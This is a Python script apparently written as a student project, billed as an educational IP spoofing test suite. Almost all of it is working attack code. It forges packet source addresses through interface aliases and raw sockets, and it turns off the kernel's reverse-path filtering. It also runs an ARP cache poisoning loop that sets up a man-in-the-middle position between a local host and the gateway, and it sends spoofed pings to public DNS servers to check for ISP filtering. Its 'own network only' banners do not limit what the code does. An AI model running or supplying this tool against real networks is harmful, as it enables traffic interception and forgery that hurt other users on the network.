#!/usr/bin/env python3
"""
COMPLETE IP SPOOFING TESTING SUITE
For Educational Testing on YOUR OWN Network/Internet
Author: Cybersecurity Student Project
"""

import os
import sys
import time
import random
import socket
import struct
import threading
import subprocess
import ipaddress
from datetime import datetime
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
import netifaces
import netaddr

import platform
if platform.system() == "Windows":
    import ctypes

# Disable Scapy warnings
conf.verb = 0

def is_admin():
    """Check for administrative/root privileges"""
    try:
        if platform.system() == "Windows":
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except AttributeError:
        return False

# ============================================
# NETWORK DISCOVERY & CONFIGURATION
# ============================================

class NetworkDiscovery:
    """Discover your network configuration for testing"""
    
    @staticmethod
    def get_network_info():
        """Get detailed network interface information"""
        interfaces = {}
        
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    if 'addr' in addr and 'netmask' in addr:
                        # Calculate network
                        ip = addr['addr']
                        netmask = addr['netmask']
                        network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                        
                        interfaces[iface] = {
                            'ip': ip,
                            'netmask': netmask,
                            'network': str(network),
                            'broadcast': network.broadcast_address
                        }
        
        return interfaces
    
    @staticmethod
    def discover_test_targets(network):
        """Discover live hosts in your network for testing"""
        print(f"[*] Scanning network: {network}")
        live_hosts = []
        
        # Simple ping sweep (safe scanning)
        network_obj = ipaddress.IPv4Network(network)
        is_windows = platform.system() == "Windows"
        
        for ip in list(network_obj.hosts())[:10]:  # Limit to first 10 hosts for testing
            if is_windows:
                cmd = f"ping -n 1 -w 500 {ip} > NUL 2>&1"
            else:
                cmd = f"ping -c 1 -W 1 {ip} > /dev/null 2>&1"
            
            response = os.system(cmd)
            if response == 0:
                live_hosts.append(str(ip))
                print(f"    [+] Found live host: {ip}")
        
        return live_hosts

# ============================================
# METHOD 1: IP ALIAS SPOOFING (WORKS ON OWN NETWORK)
# ============================================

class IPAliasSpoofer:
    """
    Method 1: Create virtual interfaces with aliased IPs
    This is the most reliable method on your own network
    """
    
    def __init__(self, interface, base_ip, netmask="255.255.255.0"):
        self.interface = interface
        self.base_ip = base_ip
        self.netmask = netmask
        self.aliases = []
        self.original_arp = None
        
    def add_ip_alias(self, alias_ip):
        """Add an IP alias to the interface"""
        try:
            # Find next available alias index
            alias_num = len(self.aliases)
            
            if platform.system() == "Windows":
                # Windows equivalent using netsh
                cmd = f'netsh interface ipv4 add address "{self.interface}" {alias_ip} {self.netmask}'
                alias_name = self.interface
            else:
                # Linux equivalent
                alias_name = f"{self.interface}:{alias_num}"
                cmd = f"sudo ifconfig {alias_name} {alias_ip} netmask {self.netmask} up"
            
            result = os.system(cmd)
            
            if result == 0:
                self.aliases.append({
                    'name': alias_name,
                    'ip': alias_ip
                })
                print(f"[✓] Alias added: {alias_ip} on {alias_name}")
                return True
            else:
                print(f"[✗] Failed to add alias {alias_ip}")
                return False
                
        except Exception as e:
            print(f"[!] Error adding alias: {e}")
            return False
    
    def remove_aliases(self):
        """Remove all IP aliases"""
        is_windows = platform.system() == "Windows"
        for alias in self.aliases:
            if is_windows:
                os.system(f'netsh interface ipv4 delete address "{alias["name"]}" {alias["ip"]}')
            else:
                os.system(f"sudo ifconfig {alias['name']} down")
        self.aliases.clear()
        print("[✓] All aliases removed")
    
    def send_spoofed_packet(self, source_ip, dest_ip, protocol='icmp'):
        """Send packet with specific source IP"""
        try:
            if protocol == 'icmp':
                packet = IP(src=source_ip, dst=dest_ip) / ICMP()
            elif protocol == 'tcp':
                packet = IP(src=source_ip, dst=dest_ip) / TCP(sport=12345, dport=80)
            elif protocol == 'udp':
                packet = IP(src=source_ip, dst=dest_ip) / UDP(sport=12345, dport=53)
            
            send(packet, verbose=0, iface=self.interface)
            return True
        except Exception as e:
            print(f"[!] Send error: {e}")
            return False

# ============================================
# METHOD 2: RAW SOCKET SPOOFING (DIRECT KERNEL BYPASS)
# ============================================

class RawSocketSpoofer:
    """
    Method 2: Use raw sockets for direct IP spoofing
    Requires kernel configuration changes
    """
    
    def __init__(self, interface):
        self.interface = interface
        self.sock = None
        self.original_rp_filter = {}
        
    def configure_kernel(self):
        """Modify kernel settings for spoofing"""
        print("\n[*] Configuring kernel for IP spoofing...")
        
        # Save and disable reverse path filtering
        for conf_file in ['all', self.interface]:
            try:
                # Save original
                with open(f'/proc/sys/net/ipv4/conf/{conf_file}/rp_filter', 'r') as f:
                    self.original_rp_filter[conf_file] = f.read().strip()
                
                # Disable
                with open(f'/proc/sys/net/ipv4/conf/{conf_file}/rp_filter', 'w') as f:
                    f.write('0')
                
                print(f"    [✓] Disabled rp_filter for {conf_file}")
            except Exception as e:
                print(f"    [!] Failed to configure {conf_file}: {e}")
        
        # Disable ICMP redirects
        try:
            with open(f'/proc/sys/net/ipv4/conf/{self.interface}/send_redirects', 'w') as f:
                f.write('0')
            print("    [✓] Disabled ICMP redirects")
        except:
            pass
    
    def restore_kernel(self):
        """Restore original kernel settings"""
        if platform.system() == "Windows":
            print("\n[*] Skipping kernel restoration on Windows (not applied)")
            return
            
        print("\n[*] Restoring kernel settings...")
        for conf_file, value in self.original_rp_filter.items():
            try:
                with open(f'/proc/sys/net/ipv4/conf/{conf_file}/rp_filter', 'w') as f:
                    f.write(value)
                print(f"    [✓] Restored rp_filter for {conf_file}")
            except:
                pass
    
    def create_raw_socket(self):
        """Create raw socket for packet crafting"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            print("[✓] Raw socket created successfully")
            return True
        except Exception as e:
            print(f"[!] Failed to create raw socket: {e}")
            return False
    
    def craft_ip_header(self, src_ip, dst_ip, protocol=1):
        """Craft custom IP header"""
        # IP header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # kernel will fill
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = protocol
        ip_check = 0  # kernel will fill
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_saddr,
            ip_daddr)
        
        return ip_header
    
    def send_raw_spoofed(self, src_ip, dst_ip, data=b"Test Packet"):
        """Send spoofed packet using raw socket"""
        try:
            packet = self.craft_ip_header(src_ip, dst_ip) + data
            self.sock.sendto(packet, (dst_ip, 0))
            return True
        except Exception as e:
            print(f"[!] Send error: {e}")
            return False

# ============================================
# METHOD 3: ARP SPOOFING (LOCAL NETWORK MANIPULATION)
# ============================================

class ARPSpoofer:
    """
    Method 3: ARP spoofing for man-in-the-middle testing
    Only works on local network
    """
    
    def __init__(self, interface):
        self.interface = interface
        self.running = False
        
    def enable_ip_forward(self):
        """Enable IP forwarding"""
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
        print("[✓] IP forwarding enabled")
    
    def disable_ip_forward(self):
        """Disable IP forwarding"""
        if platform.system() == "Windows":
            print("[!] IP forwarding manual disable not implemented for Windows")
        else:
            os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
        print("[✓] IP forwarding disabled")
    
    def get_mac(self, ip):
        """Get MAC address for IP"""
        try:
            if platform.system() == "Windows":
                # Parse arp -a output on Windows
                result = subprocess.check_output(f"arp -a {ip}", shell=True).decode()
                for line in result.split('\n'):
                    if ip in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            return parts[1]
            else:
                # Linux ARP parsing
                result = subprocess.check_output(f"arp -n {ip}", shell=True).decode()
                for line in result.split('\n'):
                    if ip in line:
                        return line.split()[2]
        except:
            return None
    
    def arp_spoof(self, target_ip, spoof_ip):
        """Send ARP reply to poison ARP cache"""
        try:
            target_mac = self.get_mac(target_ip)
            if target_mac:
                packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=spoof_ip)
                sendp(packet, iface=self.interface, verbose=0)
                return True
        except:
            pass
        return False

# ============================================
# MAIN TESTING INTERFACE
# ============================================

class IPSpoofingProject:
    """Main project controller"""
    
    def __init__(self):
        self.network_info = {}
        self.test_targets = []
        self.selected_interface = None
        self.running = False
        
    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════╗
║         IP SPOOFING TESTING SUITE - EDUCATIONAL PROJECT      ║
║                    Test on YOUR OWN Network Only            ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def setup(self):
        """Initial setup and discovery"""
        self.print_banner()
        
        print("\n[1] Discovering your network configuration...")
        self.network_info = NetworkDiscovery.get_network_info()
        
        # Display available interfaces
        print("\nAvailable network interfaces:")
        interfaces = list(self.network_info.keys())
        for i, iface in enumerate(interfaces, 1):
            info = self.network_info[iface]
            print(f"  {i}. {iface} - IP: {info['ip']} - Network: {info['network']}")
        
        # Select interface
        choice = int(input("\nSelect interface number: ")) - 1
        self.selected_interface = interfaces[choice]
        self.selected_info = self.network_info[self.selected_interface]
        
        # Discover test targets
        print(f"\n[2] Scanning network {self.selected_info['network']} for test targets...")
        self.test_targets = NetworkDiscovery.discover_test_targets(self.selected_info['network'])
        
        if not self.test_targets:
            print("    [!] No live hosts found. Using router/default gateway.")
            # Add gateway IP as test target
            gateway = self.selected_info['network'].split('.')[0:3]
            gateway.append('1')
            self.test_targets.append('.'.join(gateway))
    
    def run_alias_test(self):
        """Test Method 1: IP Alias Spoofing"""
        print("\n" + "="*60)
        print("TEST 1: IP Alias Spoofing")
        print("="*60)
        
        spoofer = IPAliasSpoofer(self.selected_interface, self.selected_info['ip'])
        
        # Generate test IPs in same network
        network_parts = self.selected_info['ip'].split('.')[:3]
        test_ips = []
        for i in range(10, 20):  # Generate 10 test IPs
            test_ip = f"{'.'.join(network_parts)}.{i}"
            test_ips.append(test_ip)
        
        try:
            for i, test_ip in enumerate(test_ips[:3]):  # Test first 3
                print(f"\n[*] Testing with source IP: {test_ip}")
                
                # Add alias
                if spoofer.add_ip_alias(test_ip):
                    # Send packets to test targets
                    for target in self.test_targets[:2]:  # Test first 2 targets
                        print(f"    Sending ICMP to {target}... ", end="")
                        if spoofer.send_spoofed_packet(test_ip, target, 'icmp'):
                            print("✓")
                        else:
                            print("✗")
                        time.sleep(1)
                    
                    # Wait a bit
                    time.sleep(2)
            
        finally:
            spoofer.remove_aliases()
    
    def run_raw_socket_test(self):
        """Test Method 2: Raw Socket Spoofing"""
        print("\n" + "="*60)
        print("TEST 2: Raw Socket Spoofing (Requires Root)")
        print("="*60)
        
        spoofer = RawSocketSpoofer(self.selected_interface)
        
        try:
            # Configure kernel
            spoofer.configure_kernel()
            
            # Create raw socket
            if not spoofer.create_raw_socket():
                return
            
            # Generate spoofed IPs (private range)
            spoofed_ips = [
                f"10.0.0.{random.randint(2,254)}",
                f"172.16.{random.randint(0,31)}.{random.randint(2,254)}",
                f"192.168.{random.randint(0,255)}.{random.randint(2,254)}"
            ]
            
            print("\n[*] Sending spoofed packets...")
            for src_ip in spoofed_ips:
                for dst_ip in self.test_targets[:2]:
                    print(f"    {src_ip} -> {dst_ip}: ", end="")
                    if spoofer.send_raw_spoofed(src_ip, dst_ip):
                        print("✓")
                    else:
                        print("✗")
                    time.sleep(1)
            
        finally:
            spoofer.restore_kernel()
    
    def run_arp_test(self):
        """Test Method 3: ARP Spoofing"""
        print("\n" + "="*60)
        print("TEST 3: ARP Spoofing (Local Network)")
        print("="*60)
        
        spoofer = ARPSpoofer(self.selected_interface)
        spoofer.enable_ip_forward()
        
        if not self.test_targets:
            print("[!] No targets available for ARP spoofing.")
            return

        target = self.test_targets[0]
        gateway = self.selected_info['network'].split('.')
        gateway[-1] = '1'
        gateway_ip = '.'.join(gateway)
        
        print(f"[*] Poisoning {target} with spoofed IP {gateway_ip}")
        print("[*] Spooling for 10 seconds... (Check with Wireshark)")
        
        try:
            for _ in range(10):
                if spoofer.arp_spoof(target, gateway_ip):
                    print(".", end="", flush=True)
                time.sleep(1)
            print("\n[✓] ARP Spoofing test complete")
        finally:
            spoofer.disable_ip_forward()

    def monitor_traffic(self):
        """Monitor and verify spoofed packets"""
        print("\n" + "="*60)
        print("VERIFYING SPOOFED TRAFFIC")
        print("="*60)
        
        # Use VerificationTools to sniff packets
        VerificationTools.start_packet_capture(self.selected_interface, duration=5)
        
        print("\nUse Wireshark for deeper analysis:")
        if platform.system() == "Windows":
             print(f"    Look for interface: {self.selected_interface}")
        else:
             print(f"    sudo tcpdump -i {self.selected_interface} -n")
        print("Look for packets with spoofed source IPs")
    
    def run(self):
        """Run all tests"""
        self.setup()
        
        print("\n" + "="*60)
        print("STARTING SPOOFING TESTS")
        print("="*60)
        print(f"\nInterface: {self.selected_interface}")
        print(f"Your IP: {self.selected_info['ip']}")
        print(f"Network: {self.selected_info['network']}")
        print(f"Test targets: {', '.join(self.test_targets)}")
        
        # Check ISP filtering first
        VerificationTools.check_isp_filtering()
        
        input("\nPress Enter to start tests...")
        
        # Run alias test
        self.run_alias_test()
        
        # Run raw socket test
        self.run_raw_socket_test()
        
        # Run ARP spoofing test
        self.run_arp_test()
        
        # Show monitoring info
        self.monitor_traffic()
        
        print("\n" + "="*60)
        print("TESTS COMPLETED")
        print("="*60)
        print("\nResults Summary:")
        print("1. IP Alias method: Should work on your network")
        print("2. Raw socket method: May be filtered by ISP")
        print("3. Check tcpdump to verify packet delivery")

# ============================================
# ADDITIONAL TESTING TOOLS
# ============================================

class VerificationTools:
    """Tools to verify spoofing success"""
    
    @staticmethod
    def start_packet_capture(interface, duration=10):
        """Capture packets to verify spoofing"""
        print(f"\n[*] Capturing packets for {duration} seconds...")
        packets = sniff(iface=interface, timeout=duration)
        
        spoofed_count = 0
        for pkt in packets:
            if IP in pkt:
                print(f"    Packet: {pkt[IP].src} -> {pkt[IP].dst}")
        
        return packets
    
    @staticmethod
    def check_isp_filtering():
        """Check if ISP filters spoofed packets"""
        print("\n[*] Testing ISP filtering...")
        
        # Try to send spoofed packet to external IP
        test_ips = [
            "1.1.1.1",  # Cloudflare DNS
            "8.8.8.8",  # Google DNS
        ]
        
        for ext_ip in test_ips:
            packet = IP(src="192.168.99.99", dst=ext_ip) / ICMP()
            reply = sr1(packet, timeout=2, verbose=0)
            
            if reply:
                print(f"    [!] Received reply from {ext_ip} - ISP NOT filtering!")
            else:
                print(f"    [✓] No reply from {ext_ip} - Likely ISP filtering")

# ============================================
# MAIN EXECUTION
# ============================================

if __name__ == "__main__":
    # Check root/admin
    if not is_admin():
        print("This script requires Administrator/Root privileges!")
        if platform.system() == "Windows":
            print("Please run PowerShell or CMD as Administrator.")
        else:
            print("Run: sudo python3 new_spoof.py")
        sys.exit(1)
    
    # Create and run project
    project = IPSpoofingProject()
    
    try:
        project.run()
    except KeyboardInterrupt:
        print("\n\n[!] Tests interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    
    print("\n" + "="*60)
    print("PROJECT COMPLETE")
    print("="*60)
    print("\nWhat you've learned:")
    print("✓ How IP spoofing technically works")
    print("✓ Why ISPs filter spoofed packets")
    print("✓ Methods that work on local networks")
    print("✓ How to test and verify results")
    print("\nRemember: Always test responsibly on your own network!")